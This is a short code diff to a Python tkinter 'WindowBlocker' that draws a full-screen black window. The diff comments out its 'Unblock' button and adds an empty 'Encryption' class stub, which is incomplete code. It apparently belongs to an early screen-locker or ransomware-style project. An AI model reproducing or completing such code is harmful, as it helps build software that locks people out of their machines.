@@ -28,14 +28,17 @@ class WindowBlocker(threading.Thread):
                     font=("Garamond", 20), fg='white', bg='black')
         label.pack(side="top", fill="both", expand=True)
         logo.pack(side="bottom", fill="both", expand=True)
-        tk.Button(self.root, text="Unblock", command=self.unblock).pack(side="bottom")
+        # tk.Button(self.root, text="Unblock", command=self.unblock).pack(side="bottom")
 
         while self.block_key:
             self.root.update()
             self.root.update_idletasks()
 
         self.root.destroy()
-    
+
+class Encryption():
+    def __init__(self):
+
 # class ClientFunctions():   
 #     def ask_for_username(self):
 #         def on_click():
